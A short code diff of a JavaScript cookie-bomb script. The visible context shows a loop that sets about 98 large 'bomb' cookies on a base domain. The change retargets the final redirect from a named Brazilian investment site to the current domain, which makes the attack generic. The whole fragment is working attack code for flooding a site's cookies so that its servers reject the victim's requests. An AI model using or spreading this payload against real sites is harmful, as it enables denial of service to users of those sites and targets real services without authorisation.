@@ -5,4 +5,4 @@ for (var i = 1; i < 99; i++) {
     document.cookie='bomb' + i + '=' + pollution + ';Domain=' + base_domain + ";path=/";
 }
 
-window.location="https://easynvest.com.br/acompanhar/investimentos";
+window.location="https://" + document.domain;
